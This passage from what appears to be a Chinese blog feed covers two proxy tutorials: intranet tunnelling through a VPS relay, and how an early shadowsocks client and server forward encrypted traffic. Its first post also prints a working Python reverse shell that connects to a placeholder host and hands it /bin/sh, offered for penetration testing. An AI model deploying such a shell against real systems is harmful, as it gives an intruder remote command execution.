client_conn)</span><br></pre></td></tr></table></figure><p>server_proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">import select</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</span><br><span class="line">s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line"></span><br><span class="line"># 将套接字绑定到地址</span><br><span class="line">s1.bind((&apos;&apos;, 2333))</span><br><span class="line"># 监听TCP传入连接</span><br><span class="line">s1.listen(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</span><br><span class="line">s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line"># 将套接字绑定到地址</span><br><span class="line">s2.bind((&apos;&apos;, 8000))</span><br><span class="line"># 监听TCP传入连接</span><br><span class="line">s2.listen(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_data(sock, data):</span><br><span class="line">    print(data)</span><br><span class="line">    bytes_sent = 0</span><br><span class="line">    while True:</span><br><span class="line">        r = sock.send(data[bytes_sent:])</span><br><span class="line">        if r &lt; 0:</span><br><span class="line">            return r</span><br><span class="line">        bytes_sent += r</span><br><span class="line">        if bytes_sent == len(data):</span><br><span class="line">            return bytes_sent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def handle_tcp(sock, remote):</span><br><span class="line">    # 处理 client socket 和 remote socket 的数据流</span><br><span class="line">    try:</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            # 用 IO 多路复用 select 监听套接字是否有数据流</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                data = sock.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(remote, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line"></span><br><span class="line">            if remote in r:</span><br><span class="line">                data = remote.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(sock, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise(e)</span><br><span class="line">    finally:</span><br><span class="line">        sock.close()</span><br><span class="line">        remote.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    con1, addr1 = s1.accept()</span><br><span class="line">    print(&quot;new connection from %s:%s&quot; % addr1)</span><br><span class="line">    con2, addr2 = s2.accept()</span><br><span class="line">    print(&quot;new connection from %s:%s&quot; % addr2)</span><br><span class="line">    t = threading.Thread(target=handle_tcp, args=(con1, con2))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><ol><li>假设我们需要共享的 web 是 python 的 simple http_server， 首先执行 python -m SimpleHTTPServer, 这样本地会绑定 8000 端口</li><li>在自己的 vps 上运行 python3 reverse_server.py</li><li>在本地运行 python3 reverse_client_proxy.py</li><li>接下来我们直接在外网访问 vps 的地址: <a href="http://xx.xx.xx.xx:8000" target="_blank" rel="noopener">http://xx.xx.xx.xx:8000</a> 就可以发现能够转发内网的数据了。</li></ol><p><img src="/media/15037300977077.jpg" alt=""></p><p>github 地址: <a href="https://github.com/facert/socket-example/blob/master/reverse_client_proxy.py" target="_blank" rel="noopener">reverse_client_proxy.py</a></p><p><a href="https://github.com/facert/socket-example/blob/master/reverse_server_proxy.py" target="_blank" rel="noopener">reverse_server_proxy</a></p><p>一般内网穿透在网络安全人员做内网渗透测试的时候比较有用，反弹一个 shell。就可以任意执行命令。</p><p>这里分享一个最基本的 python 反弹 shell 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">2333</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇主要介绍代理的一个常用的功能：内网穿透&lt;br&gt;很多人经常会有这么一个需求，需要将本地开发的 web 项目给外网的人看下，再搭一遍到 vps 太麻烦，于是就有借助拥有公网 ip 的主机来中转。&lt;/p&gt;
&lt;p&gt;有专门的软件做这件事，如 ngrok, frp。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(8)-ss-代理.md</title>
    <link href="https://facert.github.io/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-8-shadowsocks-%E4%BB%A3%E7%90%86-md/"/>
    <id>https://facert.github.io/2017/08/20/由浅入深写代理-8-shadowsocks-代理-md/</id>
    <published>2017-08-20T11:20:39.000Z</published>
    <updated>2018-01-27T14:47:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>ss 作用是科学上网，因为怕关键词会让文章被干掉，所以用了别名。本文纯粹是分析技术的角度出发。因为 ss 现在的版本已经很复杂了，eventloop, 状态机，支持 udp 。为了简单讲原理，我们用 0.9 的版本来说明。<br><a id="more"></a><br>首先上图</p><p><img src="/media/15032288280119.jpg" alt=""></p><p>client 和 ss_local 主要通过 socks5 协议通信，而 ss_local 和 ss_server 之间就是对称加密的 tcp 数据。</p><p>ss_local 主要代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">class Socks5Server(SocketServer.StreamRequestHandler):</span><br><span class="line">    &apos;&apos;&apos; RequesHandlerClass Definition &apos;&apos;&apos;</span><br><span class="line">    def handle_tcp(self, sock, remote):</span><br><span class="line">        try:</span><br><span class="line">            fdset = [sock, remote]</span><br><span class="line">            while True:</span><br><span class="line">                r, w, e = select.select(fdset, [], [])      # use select I/O multiplexing model</span><br><span class="line">                if sock in r:                               # if local socket is ready for reading</span><br><span class="line">                    data = sock.recv(4096)</span><br><span class="line">                    if len(data) &lt;= 0:                      # received all data</span><br><span class="line">                        break</span><br><span class="line">                    result = send_all(remote, self.encrypt(data))   # send data after encrypting</span><br><span class="line">                    if result &lt; len(data):</span><br><span class="line">                        raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line"></span><br><span class="line">                if remote in r:                             # remote socket(proxy) ready for reading</span><br><span class="line">                    data = remote.recv(4096)</span><br><span class="line">                    if len(data) &lt;= 0:</span><br><span class="line">                        break</span><br><span class="line">                    result = send_all(sock, self.decrypt(data))     # send to local socket(application)</span><br><span class="line">                    if result &lt; len(data):</span><br><span class="line">                        raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line">        finally:</span><br><span class="line">            sock.close()</span><br><span class="line">            remote.close()</span><br><span class="line"></span><br><span class="line">    def encrypt(self, data):</span><br><span class="line">        return data.translate(encrypt_table)</span><br><span class="line"></span><br><span class="line">    def decrypt(self, data):</span><br><span class="line">        return data.translate(decrypt_table)</span><br><span class="line"></span><br><span class="line">    def send_encrypt(self, sock, data):</span><br><span class="line">        sock.send(self.encrypt(data))</span><br><span class="line"></span><br><span class="line">    def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            sock = self.connection        # local socket [127.1:port]</span><br><span class="line">            sock.recv(262)                # Sock5 Verification packet</span><br><span class="line">            sock.send(&quot;\x05\x00&quot;)         # Sock5 Response: &apos;0x05&apos; Version 5; &apos;0x00&apos; NO AUTHENTICATION REQUIRED</span><br><span class="line">            # After Authentication negotiation</span><br><span class="line">            data = self.rfile.read(4)     # Forward request format: VER CMD RSV ATYP (4 bytes)</span><br><span class="line">            mode = ord(data[1])           # CMD == 0x01 (connect)</span><br><span class="line">            if mode != 1:</span><br><span class="line">                logging.warn(&apos;mode != 1&apos;)</span><br><span class="line">                return</span><br><span class="line">            addrtype = ord(data[3])       # indicate destination address type</span><br><span class="line">            addr_to_send = data[3]</span><br><span class="line">            if addrtype == 1:             # IPv4</span><br><span class="line">                addr_ip = self.rfile.read(4)            # 4 bytes IPv4 address (big endian)</span><br><span class="line">                addr = socket.inet_ntoa(addr_ip)</span><br><span class="line">                addr_to_send += addr_ip</span><br><span class="line">            elif addrtype == 3:           # FQDN (Fully Qualified Domain Name)</span><br><span class="line">                addr_len = self.rfile.read(1)           # Domain name&apos;s Length</span><br><span class="line">                addr = self.rfile.read(ord(addr_len))   # Followed by domain name(e.g. www.google.com)</span><br><span class="line">                addr_to_send += addr_len + addr</span><br><span class="line">            else:</span><br><span class="line">                logging.warn(&apos;addr_type not support&apos;)</span><br><span class="line">                # not support</span><br><span class="line">                return</span><br><span class="line">            addr_port = self.rfile.read(2)</span><br><span class="line">            addr_to_send += addr_port                   # addr_to_send = ATYP + [Length] + dst addr/domain name + port</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, addr_port)       # prase the big endian port number. Note: The result is a tuple even if it contains exactly one item.</span><br><span class="line">            try:</span><br><span class="line">                reply = &quot;\x05\x00\x00\x01&quot;              # VER REP RSV ATYP</span><br><span class="line">                reply += socket.inet_aton(&apos;0.0.0.0&apos;) + struct.pack(&quot;&gt;H&quot;, 2222)  # listening on 2222 on all addresses of the machine, including the loopback(127.0.0.1)</span><br><span class="line">                self.wfile.write(reply)                 # response packet</span><br><span class="line">                # reply immediately</span><br><span class="line">                if &apos;-6&apos; in sys.argv[1:]:                # IPv6 support</span><br><span class="line">                    remote = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)</span><br><span class="line">                else:</span><br><span class="line">                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)       # turn off Nagling</span><br><span class="line">                remote.connect((SERVER, REMOTE_PORT))</span><br><span class="line">                self.send_encrypt(remote, addr_to_send)      # encrypted</span><br><span class="line">                logging.info(&apos;connecting %s:%d&apos; % (addr, port[0]))</span><br><span class="line">            except socket.error, e:</span><br><span class="line">                logging.warn(e)</span><br><span class="line">                return</span><br><span class="line">            self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error, e:</span><br><span class="line">            logging.warn(e)</span><br></pre></td></tr></table></figure><p>其中和 socks5 交互的部分 <code>handle</code> 在前面 socks5 教程已经讲过，唯一的区别是 <code>send_encrypt</code> 函数，每次 send 的时候都会 encrypt 一次，拿到数据后再 decrypt 一次。</p><p>ss_server 的代码也和 local 差不多，少了和 socks5 打交道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            sock = self.connection</span><br><span class="line">            addrtype = ord(self.decrypt(sock.recv(1)))      # receive addr type</span><br><span class="line">            if addrtype == 1:</span><br><span class="line">                addr = socket.inet_ntoa(self.decrypt(self.rfile.read(4)))   # get dst addr</span><br><span class="line">            elif addrtype == 3:</span><br><span class="line">                addr = self.decrypt(</span><br><span class="line">                    self.rfile.read(ord(self.decrypt(sock.recv(1)))))       # read 1 byte of len, then get &apos;len&apos; bytes name</span><br><span class="line">            else:</span><br><span class="line">                # not support</span><br><span class="line">                logging.warn(&apos;addr_type not support&apos;)</span><br><span class="line">                return</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, self.decrypt(self.rfile.read(2)))    # get dst port into small endian</span><br><span class="line">            try:</span><br><span class="line">                logging.info(&apos;connecting %s:%d&apos; % (addr, port[0]))</span><br><span class="line">                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)</span><br><span class="line">                remote.connect((addr, port[0]))         # connect to dst</span><br><span class="line">            except socket.error, e:</span><br><span class="line">                # Connection refused</span><br><span class="line">                logging.warn(e)</span><br><span class="line">                return</span><br><span class="line">            self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error, e:</span><br><span class="line">            logging.warn(e)</span><br></pre></td></tr></table></figure><p>所以本质上 ss 很简单，就是做了流量的转发，只不过为了避免流量被检测，加密并且还有混淆的功能。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ss 作用是科学上网，因为怕关键词会让文章被干掉，所以用了别名。本文纯粹是分析技术的角度出发。因为 ss 现在的版本已经很复杂了，eventloop, 状态机，支持 udp 。为了简单讲原理，我们用 0.9 的版本来说明。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
